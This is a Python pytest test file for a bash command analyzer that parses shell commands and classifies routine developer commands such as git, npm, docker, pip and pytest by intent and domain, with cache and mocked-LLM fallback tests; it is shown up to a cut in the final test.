"""Tests for Bash Command Analysis (Story 6).

Tests the acceptance criteria:
- AC-1: BashCommandClassification model with base_command, subcommand, flags, targets
- AC-2: BashAnalyzer.classify() parses and classifies bash commands
- AC-3: Heuristic matching for common commands (git, npm, pytest, docker, pip, cargo)
- AC-4: LLM fallback for unknown commands
- AC-5: Unit tests for command parsing and classification
"""

import json
import tempfile
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from graphiti_core.session_tracking.bash_analyzer import (
    LLM_BASH_CLASSIFICATION_PROMPT,
    BashAnalyzer,
    BashCommandClassification,
    CommandHeuristic,
    LLMBashClassificationResponse,
    LLMBashClassificationResult,
)
from graphiti_core.session_tracking.tool_classifier import ToolDomain, ToolIntent


# =============================================================================
# Test Fixtures
# =============================================================================


@pytest.fixture
def temp_cache_path(tmp_path: Path) -> Path:
    """Create a temporary cache file path."""
    return tmp_path / "bash_cache.json"


@pytest.fixture
def analyzer() -> BashAnalyzer:
    """Create a BashAnalyzer without cache or LLM."""
    return BashAnalyzer()


@pytest.fixture
def analyzer_with_cache(temp_cache_path: Path) -> BashAnalyzer:
    """Create a BashAnalyzer with cache path."""
    return BashAnalyzer(cache_path=temp_cache_path)


@pytest.fixture
def mock_llm_client() -> MagicMock:
    """Create a mock LLM client."""
    client = MagicMock()
    client.generate_response = AsyncMock()
    return client


@pytest.fixture
def analyzer_with_llm(mock_llm_client: MagicMock) -> BashAnalyzer:
    """Create a BashAnalyzer with mock LLM client."""
    return BashAnalyzer(llm_client=mock_llm_client)


@pytest.fixture
def analyzer_full(temp_cache_path: Path, mock_llm_client: MagicMock) -> BashAnalyzer:
    """Create a BashAnalyzer with both cache and LLM client."""
    return BashAnalyzer(cache_path=temp_cache_path, llm_client=mock_llm_client)


# =============================================================================
# Test BashCommandClassification Model (AC-1)
# =============================================================================


class TestBashCommandClassificationModel:
    """Test BashCommandClassification Pydantic model."""

    def test_creation_with_required_fields(self):
        """Test BashCommandClassification can be created with required fields."""
        result = BashCommandClassification(
            raw_command="git commit -m 'test'",
            base_command="git",
            subcommand="commit",
            flags=["-m", "test"],
            targets=[],
            intent=ToolIntent.CREATE,
            domain=ToolDomain.VERSION_CONTROL,
            confidence=0.95,
        )
        assert result.raw_command == "git commit -m 'test'"
        assert result.base_command == "git"
        assert result.subcommand == "commit"
        assert result.flags == ["-m", "test"]
        assert result.targets == []
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.VERSION_CONTROL
        assert result.confidence == 0.95

    def test_default_values(self):
        """Test default values for optional fields."""
        result = BashCommandClassification(
            raw_command="ls",
            base_command="ls",
            intent=ToolIntent.READ,
            domain=ToolDomain.FILESYSTEM,
            confidence=0.95,
        )
        assert result.subcommand is None
        assert result.flags == []
        assert result.targets == []
        assert result.reasoning == ""
        assert result.activity_signals == {}
        assert result.method == "heuristic"

    def test_confidence_validation(self):
        """Test confidence must be between 0 and 1."""
        # Valid confidence values
        BashCommandClassification(
            raw_command="ls",
            base_command="ls",
            intent=ToolIntent.READ,
            domain=ToolDomain.FILESYSTEM,
            confidence=0.0,
        )
        BashCommandClassification(
            raw_command="ls",
            base_command="ls",
            intent=ToolIntent.READ,
            domain=ToolDomain.FILESYSTEM,
            confidence=1.0,
        )

        # Invalid confidence values
        with pytest.raises(ValueError):
            BashCommandClassification(
                raw_command="ls",
                base_command="ls",
                intent=ToolIntent.READ,
                domain=ToolDomain.FILESYSTEM,
                confidence=-0.1,
            )
        with pytest.raises(ValueError):
            BashCommandClassification(
                raw_command="ls",
                base_command="ls",
                intent=ToolIntent.READ,
                domain=ToolDomain.FILESYSTEM,
                confidence=1.1,
            )

    def test_method_literal_validation(self):
        """Test method field only accepts valid literals."""
        # Valid methods
        for method in ["heuristic", "llm", "cached"]:
            result = BashCommandClassification(
                raw_command="ls",
                base_command="ls",
                intent=ToolIntent.READ,
                domain=ToolDomain.FILESYSTEM,
                confidence=0.95,
                method=method,
            )
            assert result.method == method


class TestLLMBashClassificationResultModel:
    """Test LLMBashClassificationResult Pydantic model for LLM responses."""

    def test_creation_with_required_fields(self):
        """Test LLMBashClassificationResult can be created."""
        result = LLMBashClassificationResult(
            raw_command="custom-tool --arg",
            intent="read",
            domain="filesystem",
        )
        assert result.raw_command == "custom-tool --arg"
        assert result.intent == "read"
        assert result.domain == "filesystem"

    def test_default_activity_signals(self):
        """Test default activity_signals is empty dict."""
        result = LLMBashClassificationResult(
            raw_command="test",
            intent="read",
            domain="filesystem",
        )
        assert result.activity_signals == {}

    def test_with_activity_signals(self):
        """Test LLMBashClassificationResult with activity_signals."""
        result = LLMBashClassificationResult(
            raw_command="test",
            intent="create",
            domain="code",
            activity_signals={"building": 0.6, "refactoring": 0.3},
        )
        assert result.activity_signals == {"building": 0.6, "refactoring": 0.3}


class TestLLMBashClassificationResponseModel:
    """Test LLMBashClassificationResponse Pydantic model."""

    def test_creation_with_classifications(self):
        """Test LLMBashClassificationResponse can be created."""
        response = LLMBashClassificationResponse(
            classifications=[
                LLMBashClassificationResult(
                    raw_command="cmd1",
                    intent="read",
                    domain="filesystem",
                ),
                LLMBashClassificationResult(
                    raw_command="cmd2",
                    intent="create",
                    domain="code",
                ),
            ]
        )
        assert len(response.classifications) == 2
        assert response.classifications[0].raw_command == "cmd1"
        assert response.classifications[1].raw_command == "cmd2"

    def test_empty_classifications(self):
        """Test LLMBashClassificationResponse with empty list."""
        response = LLMBashClassificationResponse(classifications=[])
        assert response.classifications == []


# =============================================================================
# Test Command Parsing (AC-2, AC-5)
# =============================================================================


class TestCommandParsing:
    """Test _parse_command() functionality."""

    def test_parse_simple_command(self, analyzer: BashAnalyzer):
        """Test parsing simple command without flags."""
        base, sub, flags, targets = analyzer._parse_command("pytest tests/")
        assert base == "pytest"
        assert sub is None
        assert flags == []
        assert targets == ["tests/"]

    def test_parse_command_with_flags(self, analyzer: BashAnalyzer):
        """Test parsing command with flags."""
        base, sub, flags, targets = analyzer._parse_command("pytest -v --cov=src tests/")
        assert base == "pytest"
        assert sub is None
        assert flags == ["-v", "--cov=src"]
        assert targets == ["tests/"]

    def test_parse_command_with_subcommand(self, analyzer: BashAnalyzer):
        """Test parsing command with subcommand."""
        base, sub, flags, targets = analyzer._parse_command("git commit -m 'message'")
        assert base == "git"
        assert sub == "commit"
        assert "-m" in flags
        assert "message" in flags

    def test_parse_docker_command(self, analyzer: BashAnalyzer):
        """Test parsing docker command with subcommand and flags."""
        base, sub, flags, targets = analyzer._parse_command("docker run -d -p 8080:80 nginx")
        assert base == "docker"
        assert sub == "run"
        assert "-d" in flags
        assert "-p" in flags
        assert "8080:80" in flags
        assert "nginx" in targets

    def test_parse_npm_install(self, analyzer: BashAnalyzer):
        """Test parsing npm install command."""
        base, sub, flags, targets = analyzer._parse_command("npm install --save-dev typescript")
        assert base == "npm"
        assert sub == "install"
        assert "--save-dev" in flags
        assert "typescript" in targets

    def test_parse_quoted_args(self, analyzer: BashAnalyzer):
        """Test parsing command with quoted arguments."""
        base, sub, flags, targets = analyzer._parse_command("git commit -m 'fix: handle edge case'")
        assert base == "git"
        assert sub == "commit"
        assert "-m" in flags
        assert "fix: handle edge case" in flags

    def test_parse_chained_command_and(self, analyzer: BashAnalyzer):
        """Test parsing chained command with && (only first command)."""
        base, sub, flags, targets = analyzer._parse_command("cd /foo && make test")
        assert base == "cd"
        assert sub is None
        assert "/foo" in targets

    def test_parse_chained_command_or(self, analyzer: BashAnalyzer):
        """Test parsing chained command with || (only first command)."""
        base, sub, flags, targets = analyzer._parse_command("test -f file || touch file")
        assert base == "test"
        assert "-f" in flags
        # Note: "file" is treated as a flag value because -f takes a value
        # This is expected behavior for the parser's flag handling

    def test_parse_piped_command(self, analyzer: BashAnalyzer):
        """Test parsing piped command (only first command)."""
        base, sub, flags, targets = analyzer._parse_command("cat file.txt | grep pattern")
        assert base == "cat"
        assert "file.txt" in targets

    def test_parse_command_with_path(self, analyzer: BashAnalyzer):
        """Test parsing command with full path."""
        base, sub, flags, targets = analyzer._parse_command("/usr/bin/git status")
        assert base == "git"
        assert sub == "status"

    def test_parse_empty_command(self, analyzer: BashAnalyzer):
        """Test parsing empty command."""
        base, sub, flags, targets = analyzer._parse_command("")
        assert base == ""
        assert sub is None
        assert flags == []
        assert targets == []

    def test_parse_command_with_equals_flag(self, analyzer: BashAnalyzer):
        """Test parsing command with --flag=value style."""
        base, sub, flags, targets = analyzer._parse_command("pytest --cov=graphiti_core tests/")
        assert base == "pytest"
        assert "--cov=graphiti_core" in flags

    def test_parse_git_add_with_multiple_targets(self, analyzer: BashAnalyzer):
        """Test parsing git add with multiple file targets."""
        base, sub, flags, targets = analyzer._parse_command("git add file1.py file2.py file3.py")
        assert base == "git"
        assert sub == "add"
        assert "file1.py" in targets
        assert "file2.py" in targets
        assert "file3.py" in targets

    def test_parse_python_module_execution(self, analyzer: BashAnalyzer):
        """Test parsing python -m command."""
        base, sub, flags, targets = analyzer._parse_command("python -m pytest tests/")
        assert base == "python"
        # -m is treated as a flag, not a subcommand, because it starts with -
        assert "-m" in flags
        assert "pytest" in flags  # pytest is the value of -m flag

    def test_parse_command_with_semicolon(self, analyzer: BashAnalyzer):
        """Test parsing command with semicolon (only first command)."""
        base, sub, flags, targets = analyzer._parse_command("echo hello; echo world")
        assert base == "echo"
        assert "hello" in targets


# =============================================================================
# Test Heuristic Classification (AC-3, AC-5)
# =============================================================================


class TestHeuristicClassification:
    """Test heuristic classification for common commands."""

    # Git commands
    def test_classify_git_commit(self, analyzer: BashAnalyzer):
        """Test classification of git commit."""
        result = analyzer.classify("git commit -m 'feat: new feature'")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.VERSION_CONTROL
        assert result.confidence >= 0.9
        assert result.method == "heuristic"

    def test_classify_git_add(self, analyzer: BashAnalyzer):
        """Test classification of git add."""
        result = analyzer.classify("git add .")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.VERSION_CONTROL

    def test_classify_git_push(self, analyzer: BashAnalyzer):
        """Test classification of git push."""
        result = analyzer.classify("git push origin main")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.VERSION_CONTROL

    def test_classify_git_pull(self, analyzer: BashAnalyzer):
        """Test classification of git pull."""
        result = analyzer.classify("git pull")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.VERSION_CONTROL

    def test_classify_git_clone(self, analyzer: BashAnalyzer):
        """Test classification of git clone."""
        result = analyzer.classify("git clone https://github.com/repo.git")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.VERSION_CONTROL

    def test_classify_git_status(self, analyzer: BashAnalyzer):
        """Test classification of git status."""
        result = analyzer.classify("git status")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.VERSION_CONTROL

    def test_classify_git_diff(self, analyzer: BashAnalyzer):
        """Test classification of git diff."""
        result = analyzer.classify("git diff HEAD~1")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.VERSION_CONTROL

    def test_classify_git_checkout(self, analyzer: BashAnalyzer):
        """Test classification of git checkout."""
        result = analyzer.classify("git checkout -b feature-branch")
        assert result.intent == ToolIntent.MODIFY
        assert result.domain == ToolDomain.VERSION_CONTROL

    def test_classify_git_merge(self, analyzer: BashAnalyzer):
        """Test classification of git merge."""
        result = analyzer.classify("git merge main")
        assert result.intent == ToolIntent.MODIFY
        assert result.domain == ToolDomain.VERSION_CONTROL

    def test_classify_git_rm(self, analyzer: BashAnalyzer):
        """Test classification of git rm."""
        result = analyzer.classify("git rm file.txt")
        assert result.intent == ToolIntent.DELETE
        assert result.domain == ToolDomain.VERSION_CONTROL

    # NPM commands
    def test_classify_npm_install(self, analyzer: BashAnalyzer):
        """Test classification of npm install."""
        result = analyzer.classify("npm install lodash")
        assert result.intent == ToolIntent.CONFIGURE
        assert result.domain == ToolDomain.PACKAGE

    def test_classify_npm_i(self, analyzer: BashAnalyzer):
        """Test classification of npm i (alias)."""
        result = analyzer.classify("npm i typescript")
        assert result.intent == ToolIntent.CONFIGURE
        assert result.domain == ToolDomain.PACKAGE

    def test_classify_npm_run(self, analyzer: BashAnalyzer):
        """Test classification of npm run."""
        result = analyzer.classify("npm run build")
        assert result.intent == ToolIntent.EXECUTE
        assert result.domain == ToolDomain.PROCESS

    def test_classify_npm_test(self, analyzer: BashAnalyzer):
        """Test classification of npm test."""
        result = analyzer.classify("npm test")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.TESTING

    def test_classify_npm_remove(self, analyzer: BashAnalyzer):
        """Test classification of npm remove."""
        result = analyzer.classify("npm remove lodash")
        assert result.intent == ToolIntent.DELETE
        assert result.domain == ToolDomain.PACKAGE

    def test_classify_yarn_add(self, analyzer: BashAnalyzer):
        """Test classification of yarn add."""
        result = analyzer.classify("yarn add react")
        assert result.intent == ToolIntent.CONFIGURE
        assert result.domain == ToolDomain.PACKAGE

    def test_classify_pnpm_install(self, analyzer: BashAnalyzer):
        """Test classification of pnpm install."""
        result = analyzer.classify("pnpm install")
        assert result.intent == ToolIntent.CONFIGURE
        assert result.domain == ToolDomain.PACKAGE

    # Test runners
    def test_classify_pytest(self, analyzer: BashAnalyzer):
        """Test classification of pytest."""
        result = analyzer.classify("pytest tests/ -v")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.TESTING
        assert result.confidence >= 0.9

    def test_classify_jest(self, analyzer: BashAnalyzer):
        """Test classification of jest."""
        result = analyzer.classify("jest --coverage")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.TESTING

    def test_classify_mocha(self, analyzer: BashAnalyzer):
        """Test classification of mocha."""
        result = analyzer.classify("mocha test/**/*.spec.js")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.TESTING

    # Docker commands
    def test_classify_docker_run(self, analyzer: BashAnalyzer):
        """Test classification of docker run."""
        result = analyzer.classify("docker run -d nginx")
        assert result.intent == ToolIntent.EXECUTE
        assert result.domain == ToolDomain.PROCESS

    def test_classify_docker_build(self, analyzer: BashAnalyzer):
        """Test classification of docker build."""
        result = analyzer.classify("docker build -t myapp .")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.PROCESS

    def test_classify_docker_push(self, analyzer: BashAnalyzer):
        """Test classification of docker push."""
        result = analyzer.classify("docker push myregistry/myapp")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.NETWORK

    def test_classify_docker_pull(self, analyzer: BashAnalyzer):
        """Test classification of docker pull."""
        result = analyzer.classify("docker pull nginx")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.NETWORK

    def test_classify_docker_logs(self, analyzer: BashAnalyzer):
        """Test classification of docker logs."""
        result = analyzer.classify("docker logs container_id")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.PROCESS

    def test_classify_docker_rm(self, analyzer: BashAnalyzer):
        """Test classification of docker rm."""
        result = analyzer.classify("docker rm container_id")
        assert result.intent == ToolIntent.DELETE
        assert result.domain == ToolDomain.PROCESS

    # Python package managers
    def test_classify_pip_install(self, analyzer: BashAnalyzer):
        """Test classification of pip install."""
        result = analyzer.classify("pip install requests")
        assert result.intent == ToolIntent.CONFIGURE
        assert result.domain == ToolDomain.PACKAGE

    def test_classify_pip_uninstall(self, analyzer: BashAnalyzer):
        """Test classification of pip uninstall."""
        result = analyzer.classify("pip uninstall requests")
        assert result.intent == ToolIntent.DELETE
        assert result.domain == ToolDomain.PACKAGE

    def test_classify_pip_freeze(self, analyzer: BashAnalyzer):
        """Test classification of pip freeze."""
        result = analyzer.classify("pip freeze > requirements.txt")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.PACKAGE

    def test_classify_uv_sync(self, analyzer: BashAnalyzer):
        """Test classification of uv sync."""
        result = analyzer.classify("uv sync")
        assert result.intent == ToolIntent.CONFIGURE
        assert result.domain == ToolDomain.PACKAGE

    def test_classify_poetry_install(self, analyzer: BashAnalyzer):
        """Test classification of poetry install."""
        result = analyzer.classify("poetry install")
        assert result.intent == ToolIntent.CONFIGURE
        assert result.domain == ToolDomain.PACKAGE

    # Cargo (Rust)
    def test_classify_cargo_build(self, analyzer: BashAnalyzer):
        """Test classification of cargo build."""
        result = analyzer.classify("cargo build --release")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.CODE

    def test_classify_cargo_test(self, analyzer: BashAnalyzer):
        """Test classification of cargo test."""
        result = analyzer.classify("cargo test")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.TESTING

    def test_classify_cargo_run(self, analyzer: BashAnalyzer):
        """Test classification of cargo run."""
        result = analyzer.classify("cargo run")
        assert result.intent == ToolIntent.EXECUTE
        assert result.domain == ToolDomain.PROCESS

    def test_classify_cargo_add(self, analyzer: BashAnalyzer):
        """Test classification of cargo add."""
        result = analyzer.classify("cargo add serde")
        assert result.intent == ToolIntent.CONFIGURE
        assert result.domain == ToolDomain.PACKAGE

    # Build tools
    def test_classify_make(self, analyzer: BashAnalyzer):
        """Test classification of make."""
        result = analyzer.classify("make build")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.PROCESS

    def test_classify_make_test(self, analyzer: BashAnalyzer):
        """Test classification of make test."""
        result = analyzer.classify("make test")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.TESTING

    def test_classify_make_clean(self, analyzer: BashAnalyzer):
        """Test classification of make clean."""
        result = analyzer.classify("make clean")
        assert result.intent == ToolIntent.DELETE
        assert result.domain == ToolDomain.FILESYSTEM

    # File system commands
    def test_classify_ls(self, analyzer: BashAnalyzer):
        """Test classification of ls."""
        result = analyzer.classify("ls -la")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.FILESYSTEM

    def test_classify_cat(self, analyzer: BashAnalyzer):
        """Test classification of cat."""
        result = analyzer.classify("cat file.txt")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.FILESYSTEM

    def test_classify_find(self, analyzer: BashAnalyzer):
        """Test classification of find."""
        result = analyzer.classify("find . -name '*.py'")
        assert result.intent == ToolIntent.SEARCH
        assert result.domain == ToolDomain.FILESYSTEM

    def test_classify_grep(self, analyzer: BashAnalyzer):
        """Test classification of grep."""
        result = analyzer.classify("grep -r 'pattern' .")
        assert result.intent == ToolIntent.SEARCH
        assert result.domain == ToolDomain.FILESYSTEM

    def test_classify_mkdir(self, analyzer: BashAnalyzer):
        """Test classification of mkdir."""
        result = analyzer.classify("mkdir -p new_dir")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.FILESYSTEM

    def test_classify_rm(self, analyzer: BashAnalyzer):
        """Test classification of rm."""
        result = analyzer.classify("rm -rf temp/")
        assert result.intent == ToolIntent.DELETE
        assert result.domain == ToolDomain.FILESYSTEM

    def test_classify_cp(self, analyzer: BashAnalyzer):
        """Test classification of cp."""
        result = analyzer.classify("cp file.txt backup/")
        assert result.intent == ToolIntent.CREATE
        assert result.domain == ToolDomain.FILESYSTEM

    def test_classify_mv(self, analyzer: BashAnalyzer):
        """Test classification of mv."""
        result = analyzer.classify("mv old_name.txt new_name.txt")
        assert result.intent == ToolIntent.MODIFY
        assert result.domain == ToolDomain.FILESYSTEM

    # Code formatters/linters
    def test_classify_black(self, analyzer: BashAnalyzer):
        """Test classification of black."""
        result = analyzer.classify("black .")
        assert result.intent == ToolIntent.MODIFY
        assert result.domain == ToolDomain.CODE

    def test_classify_ruff_check(self, analyzer: BashAnalyzer):
        """Test classification of ruff check."""
        result = analyzer.classify("ruff check .")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.CODE

    def test_classify_ruff_format(self, analyzer: BashAnalyzer):
        """Test classification of ruff format."""
        result = analyzer.classify("ruff format .")
        assert result.intent == ToolIntent.MODIFY
        assert result.domain == ToolDomain.CODE

    def test_classify_mypy(self, analyzer: BashAnalyzer):
        """Test classification of mypy."""
        result = analyzer.classify("mypy src/")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.CODE

    def test_classify_eslint(self, analyzer: BashAnalyzer):
        """Test classification of eslint."""
        result = analyzer.classify("eslint src/**/*.js")
        assert result.intent == ToolIntent.VALIDATE
        assert result.domain == ToolDomain.CODE

    # Network commands
    def test_classify_curl(self, analyzer: BashAnalyzer):
        """Test classification of curl."""
        result = analyzer.classify("curl https://api.example.com")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.NETWORK

    def test_classify_wget(self, analyzer: BashAnalyzer):
        """Test classification of wget."""
        result = analyzer.classify("wget https://example.com/file.zip")
        assert result.intent == ToolIntent.READ
        assert result.domain == ToolDomain.NETWORK

    # Unknown command fallback
    def test_classify_unknown_command(self, analyzer: BashAnalyzer):
        """Test classification of unknown command."""
        result = analyzer.classify("completely_unknown_command_xyz123 --arg")
        assert result.intent == ToolIntent.EXECUTE
        assert result.domain == ToolDomain.UNKNOWN
        assert result.confidence == 0.3


# =============================================================================
# Test Activity Signals Computation (AC-5)
# =============================================================================


class TestActivitySignals:
    """Test activity signal computation from intent and domain."""

    def test_git_commit_signals(self, analyzer: BashAnalyzer):
        """Test git commit boosts building activity."""
        result = analyzer.classify("git commit -m 'feat: new'")
        assert "building" in result.activity_signals
        assert result.activity_signals["building"] > 0

    def test_pytest_signals(self, analyzer: BashAnalyzer):
        """Test pytest boosts testing activity."""
        result = analyzer.classify("pytest tests/")
        assert "testing" in result.activity_signals
        assert result.activity_signals["testing"] >= 0.9

    def test_npm_install_signals(self, analyzer: BashAnalyzer):
        """Test npm install boosts configuring activity."""
        result = analyzer.classify("npm install lodash")
        assert "configuring" in result.activity_signals
        assert result.activity_signals["configuring"] >= 0.7

    def test_grep_signals(self, analyzer: BashAnalyzer):
        """Test grep boosts exploring activity."""
        result = analyzer.classify("grep -r 'pattern' .")
        assert "exploring" in result.activity_signals
        assert result.activity_signals["exploring"] > 0

    def test_rm_signals(self, analyzer: BashAnalyzer):
        """Test rm boosts refactoring activity."""
        result = analyzer.classify("rm file.txt")
        assert "refactoring" in result.activity_signals
        assert result.activity_signals["refactoring"] > 0

    def test_signals_capped_at_one(self, analyzer: BashAnalyzer):
        """Test activity signals are capped at 1.0."""
        result = analyzer.classify("pytest tests/")
        for dim, value in result.activity_signals.items():
            assert value <= 1.0

    def test_domain_modifiers_applied(self, analyzer: BashAnalyzer):
        """Test domain modifiers are applied to signals."""
        # Testing domain should boost testing signal
        result = analyzer.classify("pytest")
        # VALIDATE intent gives 0.9 testing + TESTING domain gives 0.3 testing = 1.0 (capped)
        assert result.activity_signals.get("testing", 0) == 1.0


# =============================================================================
# Test Cache Functionality
# =============================================================================


class TestCacheKeyGeneration:
    """Test cache key generation for bash commands."""

    def test_cache_key_consistency(self, analyzer: BashAnalyzer):
        """Test same command produces same cache key."""
        key1 = analyzer._get_cache_key("git commit -m 'test'")
        key2 = analyzer._get_cache_key("git commit -m 'test'")
        assert key1 == key2

    def test_cache_key_case_insensitive(self, analyzer: BashAnalyzer):
        """Test cache key is case insensitive."""
        key1 = analyzer._get_cache_key("Git Commit")
        key2 = analyzer._get_cache_key("git commit")
        assert key1 == key2

    def test_cache_key_strips_whitespace(self, analyzer: BashAnalyzer):
        """Test cache key strips leading/trailing whitespace."""
        key1 = analyzer._get_cache_key("  git commit  ")
        key2 = analyzer._get_cache_key("git commit")
        assert key1 == key2

    def test_different_commands_different_keys(self, analyzer: BashAnalyzer):
        """Test different commands produce different keys."""
        key1 = analyzer._get_cache_key("git commit")
        key2 = analyzer._get_cache_key("git push")
        assert key1 != key2


class TestCachePersistence:
    """Test save_cache() and _load_cache() for persistence."""

    def test_save_cache_creates_json(self, analyzer_with_cache: BashAnalyzer, temp_cache_path: Path):
        """Test save_cache() creates JSON file."""
        # Classify a command to populate cache
        analyzer_with_cache.classify("git commit -m 'test'")

        # Save cache
        analyzer_with_cache.save_cache()

        # Verify file exists
        assert temp_cache_path.exists()

        # Verify JSON structure
        with open(temp_cache_path) as f:
            data = json.load(f)

        assert "version" in data
        assert "classifications" in data
        assert len(data["classifications"]) >= 1

    def test_load_cache_restores_entries(self, temp_cache_path: Path):
        """Test _load_cache() restores cached entries."""
        # Create cache file
        cache_data = {
            "version": "1.0",
            "classifications": {
                "abc12345": {
                    "raw_command": "git commit -m 'test'",
                    "base_command": "git",
                    "subcommand": "commit",
                    "flags": ["-m", "test"],
                    "targets": [],
                    "intent": "create",
                    "domain": "version_control",
                    "confidence": 0.95,
                    "reasoning": "test",
                    "activity_signals": {"building": 0.6},
                    "method": "heuristic",
                }
            },
        }
        with open(temp_cache_path, "w") as f:
            json.dump(cache_data, f)

        # Create analyzer (loads cache in __init__)
        analyzer = BashAnalyzer(cache_path=temp_cache_path)

        # Verify entries restored
        assert "abc12345" in analyzer._cache

    def test_load_cache_handles_missing_file(self, temp_cache_path: Path):
        """Test _load_cache() handles missing file gracefully."""
        assert not temp_cache_path.exists()
        analyzer = BashAnalyzer(cache_path=temp_cache_path)
        assert len(analyzer._cache) == 0

    def test_load_cache_handles_corrupted_json(self, temp_cache_path: Path):
        """Test _load_cache() handles corrupted JSON gracefully."""
        with open(temp_cache_path, "w") as f:
            f.write("not valid json {{{")

        analyzer = BashAnalyzer(cache_path=temp_cache_path)
        assert len(analyzer._cache) == 0

    def test_cache_survives_round_trip(self, temp_cache_path: Path):
        """Test cache survives save -> new instance -> load."""
        # Create analyzer and classify
        analyzer1 = BashAnalyzer(cache_path=temp_cache_path)
        result1 = analyzer1.classify("git commit -m 'test'")
        analyzer1.save_cache()

        # Create new instance (loads from file)
        analyzer2 = BashAnalyzer(cache_path=temp_cache_path)

        # Classify same command - should hit cache
        result2 = analyzer2.classify("git commit -m 'test'")
        assert result2.method == "cached"
        assert result2.intent == result1.intent
        assert result2.domain == result1.domain

    def test_save_cache_no_op_without_path(self, analyzer: BashAnalyzer):
        """Test save_cache() does nothing if no cache_path configured."""
        analyzer.save_cache()  # Should not raise


class TestCacheHierarchy:
    """Test cache lookup in classify() method."""

    def test_cache_hit_returns_cached_method(self, analyzer: BashAnalyzer):
        """Test cache hit returns classification with method='cached'."""
        # First call - heuristic
        result1 = analyzer.classify("git commit -m 'test'")
        assert result1.method == "heuristic"

        # Second call - cached
        result2 = analyzer.classify("git commit -m 'test'")
        assert result2.method == "cached"
        assert result2.intent == result1.intent
        assert result2.domain == result1.domain


# =============================================================================
# Test LLM Fallback Classification (AC-4)
# =============================================================================


class TestLLMClassification:
    """Test LLM classification for unknown commands."""

    def test_llm_prompt_contains_required_elements(self):
        """Test LLM_BASH_CLASSIFICATION_PROMPT has required elements."""
        assert "Intent:" in LLM_BASH_CLASSIFICATION_PROMPT
        assert "Domain:" in LLM_BASH_CLASSIFICATION_PROMPT
        assert "Activity Signals:" in LLM_BASH_CLASSIFICATION_PROMPT
        assert "{commands_json}" in LLM_BASH_CLASSIFICATION_PROMPT

    @pytest.mark.asyncio
    async def test_llm_fallback_when_unknown_command(
        self, analyzer_with_llm: BashAnalyzer, mock_llm_client: MagicMock
    ):
        """Test LLM is used for unknown commands in batch mode."""
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "custom-tool --arg value",
                    "intent": "execute",
                    "domain": "process",
                    "activity_signals": {"building": 0.3},
                    "reasoning": "Custom tool execution",
                }
            ]
        }

        results = await analyzer_with_llm.classify_batch(["custom-tool --arg value"])

        assert len(results) == 1
        assert results[0].method == "llm"
        mock_llm_client.generate_response.assert_called_once()

    @pytest.mark.asyncio
    async def test_llm_response_parsing(
        self, analyzer_with_llm: BashAnalyzer, mock_llm_client: MagicMock
    ):
        """Test LLM response is correctly parsed."""
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "custom-tool",
                    "intent": "create",
                    "domain": "code",
                    "activity_signals": {"building": 0.7, "refactoring": 0.2},
                    "reasoning": "Building code",
                }
            ]
        }

        results = await analyzer_with_llm.classify_batch(["custom-tool"])

        assert len(results) == 1
        assert results[0].intent == ToolIntent.CREATE
        assert results[0].domain == ToolDomain.CODE
        assert results[0].confidence == 0.85  # LLM confidence
        assert results[0].activity_signals == {"building": 0.7, "refactoring": 0.2}
        assert results[0].method == "llm"

    @pytest.mark.asyncio
    async def test_llm_batch_classification(
        self, analyzer_with_llm: BashAnalyzer, mock_llm_client: MagicMock
    ):
        """Test multiple unknown commands are batched to single LLM call."""
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "custom-a",
                    "intent": "read",
                    "domain": "filesystem",
                    "activity_signals": {},
                    "reasoning": "Reading",
                },
                {
                    "raw_command": "custom-b",
                    "intent": "create",
                    "domain": "code",
                    "activity_signals": {},
                    "reasoning": "Creating",
                },
            ]
        }

        results = await analyzer_with_llm.classify_batch(["custom-a", "custom-b"])

        # Should only call LLM once
        assert mock_llm_client.generate_response.call_count == 1
        assert len(results) == 2

    @pytest.mark.asyncio
    async def test_cache_updated_after_llm_call(
        self, analyzer_with_llm: BashAnalyzer, mock_llm_client: MagicMock
    ):
        """Test cache is updated after LLM classification."""
        mock_llm_client.generate_response.return_value = {
            "classifications": [
                {
                    "raw_command": "new-tool",
                    "intent": "modify",
                    "domain": "database",
                    "activity_signals": {},
                    "reasoning": "Modifying",
                }
            ]
        }

        # First call - should use LLM
        results1 = await analyzer_with_llm.classify_batch(["new-tool"])
        assert results1[0].method == "llm"

        # Second call - should use cache
        results2 = await analyzer_with_llm.classify_batch(["new-tool"])
        assert results2[0].method == "cached"

        # LLM should only be called once
        assert mock_llm_client.generate_response.call_count == 1

    @pytest.mark.asyncio
    async def test_llm_handles_invalid_intent(
